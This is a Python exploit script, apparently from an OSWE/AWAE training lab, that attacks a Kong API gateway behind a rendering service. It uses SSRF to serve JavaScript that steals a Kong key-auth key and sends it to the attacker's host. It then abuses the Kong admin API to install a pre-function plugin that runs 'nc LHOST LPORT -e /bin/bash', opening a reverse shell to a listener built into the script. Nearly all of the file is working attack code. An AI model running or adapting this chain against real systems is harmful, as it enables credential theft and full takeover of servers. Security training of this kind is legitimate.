#!/usr/bin/python3
from flask import Flask, request, send_file, make_response
from flask_cors import CORS
import time,urllib,threading,requests,sys,socket, logging

def getkey():
    requests.post("http://{}:{}/files/import".format(rhost,rport), json={"url":"http://render:9000/api/render?url=http://192.168.119.135"})
def exploit(key):
    requests.post("http://{}:{}/render".format(rhost,rport), json={"url":"http://{}:{}/rce".format(lhost,webport)}, headers={"apikey":key})
    time.sleep(2)
    requests.get("http://{}:{}/awae".format(rhost,rport))
def runflask(ip,port):
    app.run(host=ip, port=port)
def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    conn.send("echo \"$(whoami)@$(hostname)-[$(pwd)]\"\n".encode())
    while True:
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        if command == "exit":
            conn.send("exit\n".encode())
            conn.recv(1024).decode()
            conn.close()
            sys.exit()
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
        sys.stdout.write(ans.split("\n")[-1])

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
CORS(app)
@app.route('/', methods=['GET'])
def mainpage():
    print("[+] Catch request for mainpage")
    resp = make_response("<script type='text/javascript' src='http://{}:{}/ssrf.js'></script>".format(lhost,webport), 200)
    resp.mimetype = "text/html"
    return resp
@app.route('/ssrf.js', methods=['GET'])
def ssrf():
    print("[+] Sending Payload")
    resp = make_response(ssrfjs, 200)
    resp.mimetype = "text/javascript"
    return resp
@app.route('/post', methods=['POST'])
def post():
    msg = request.form.get('msg')
    err = request.form.get('err')
    key = request.form.get('key')
    if err:
        print("[!] Error occured: {}".format(err))
    elif msg:
        print("[$] Data received: {}".format(msg))
    elif key:
        print("[$] Key received: {}".format(key))
        exploit(key)
    else:
        print("[!] Unexpected error")
    resp = make_response("", 200)
    resp.mimetype = "text/plain"
    return resp
@app.route('/rce', methods=['GET'])
def rce():
    print('[+] Got request for RCE...')
    resp = make_response(rcehtml,200)
    resp.mimetype = "text/html"
    return resp

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of apigateway")
        print("(+) RPORT - Remote web-server port")
        print("(+) LHOST - Local IP Address to get shell")
        print("(+) LPORT - Local Port to get shell")
        print("(+) WEBPORT - Local port to run webserver\n")
        sys.exit(-1)
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    webport = sys.argv[5]
    ssrfjs = '''function sendpost(params) {{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://{}:{}/post', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send(params)
}}
async function getweb(url) {{
fetch(url)
.then((response) => response.text())
.then((data) => sendpost("key=" + encodeURIComponent(JSON.parse(data).data[0].key))).catch(err => sendpost("err=" + encodeURIComponent(err)));
}}
getweb("http://kong:8001/key-auths");'''.format(lhost,webport)

    rcehtml = '''<html><head><script>
function sendpost(params) {{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://{lhost}:{webport}/post', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send(params)
}}
function cs() {{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://kong:8001/services', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send('{{"name":"awae","url":"http://127.0.0.1/"}}');
    xhr.onload = () => {{
        sendpost("msg="+xhr.response);
        cr();
    }}
}}
function cr() {{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://kong:8001/services/awae/routes', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send('{{"paths":["/awae"]}}');
    xhr.onload = () => {{
        sendpost("msg="+xhr.response);
        cp();
    }} 
}}
function cp() {{
    var xhr = new XMLHttpRequest();
    var data = new FormData();
    data.append("name","pre-function");
    const shell = 'require("os");os.execute("nc {lhost} {lport} -e /bin/bash");';
    const blob = new Blob([shell], {{type:"application/octet-stream"}});
    data.append("config.access[1]",blob);
    xhr.open('POST', 'http://kong:8001/services/awae/plugins', true);
    xhr.send(data)
    xhr.onload = () => {{ sendpost("msg="+xhr.response) }}; 
}}
cs();
</script></head></html>'''.format(lhost=lhost,lport=lport,webport=webport)
    listener_thread = threading.Thread(target=listen, args=(lhost,lport))
    flask_thread = threading.Thread(target=runflask, args=(lhost,int(webport)))
    flask_thread.start()
    listener_thread.start()
    time.sleep(1)
    getkey()
    listener_thread.join()
